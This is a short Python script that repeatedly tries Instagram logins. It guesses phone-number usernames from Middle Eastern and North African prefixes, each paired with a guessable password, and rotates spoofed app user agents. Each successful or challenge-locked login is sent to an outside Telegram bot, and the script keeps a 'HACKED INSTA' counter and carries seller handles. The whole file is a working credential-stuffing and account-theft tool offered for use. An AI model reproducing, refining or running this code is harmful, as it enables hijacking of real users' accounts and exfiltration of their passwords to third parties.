import random,time,requests,os
from uuid import uuid4
uid = str(uuid4())
r = requests.session()
g=0
e=0
s=0
bl=0
xx=''
smsg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=HI").json()
id_msg = smsg['result']['message_id']
user_agent = ['Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
    'Instagram 155.0.0.37.107 Android (28/9; 320dpi; 720x1468; samsung; SM-A102U; a10e; exynos7885; en_US; 239490550)',
    'Instagram 64.0.0.12.96 (iPhone8,1; iOS 12_0_1; pt_BR; pt-BR; scale=2.00; gamut=normal; 750x1334; 124976489)',
    'Instagram 8.4.0 (iPhone7,2; iPhone OS 9_3_2; nb_NO; nb-NO; scale=2.00; 750x1334',
    'Instagram 93.1.0.19.102 Android (21/5.0.2; 240dpi; 540x960; samsung; SM-G530H; fortuna3g; qcom; ar_AE; 154400379)'
]
d=["+989334:09334","+96550:50","+21377:077","+98913:0913","+96654:054","+9689:09689","+96653:053","+96655:055","+96650:050","+96658:058","+96659:059","+96657:057","+96656:056","+21366:066","+98991:0991","+9687:09687","+98913:0913","+98913:0913"]
while True:
	xx=random.choice(d)
	X=random.choice(user_agent)
	if "+968" in xx :
		x=8
	else:
		x=7
	us = str(''.join((random.choice("0123456789") for i in range(7))))
	user=str(xx).split(":")[0]+us
	pas=str(xx).split(":")[1]+us
	url = 'https://b.i.instagram.com/api/v1/accounts/login/'
	headers = {'User-Agent':X,  'Accept':'*/*',  'Cookie':'missing', 
                 'Accept-Encoding':'gzip, deflate', 
                 'Accept-Language':'en-US', 
                 'X-IG-Capabilities':'3brTvw==', 
                 'X-IG-Connection-Type':'WIFI', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'Host':'i.instagram.com'}
	data = {'uuid':uid,  'password':pas,  'username':user, 
                 'device_id':uid, 
                 'from_reg':'false', 
                 '_csrftoken':'missing', 
                 'login_attempt_countn':'0'}
	req = r.post(url, headers=headers, data=data, allow_redirects=True)
	if 'logged_in_user' in req.text:
		g+=1
		requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=NEW ACC INSTA\nuser : {user}\npass : {pas}\nGOOD")
	elif '"message":"challenge_required","challenge"' in req.text:
		s+=1
		requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=NEW ACC INSTA\nuser : {user}\npass : {pas}\nSECURE")
	elif 'Please wait a few minutes' in req.text:
		bl+=1
	else:
		e+=1
	print(os.system("clear"),f"\r[$] Good -{g}- | Secure -{s}- | Bad -{e}- | Block -{bl}- | {user}:{pas} ",end='')
	requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= HACKED INSTA\nGOOD [ {g} ]\nSECURE [ {s} ]\nBAD [ {e} ]\nBLOCK [ {bl} ]\n[ {user}:{pas} ]\nINSTA : @M0B.STORE | TELE : @ZXXXXZV")
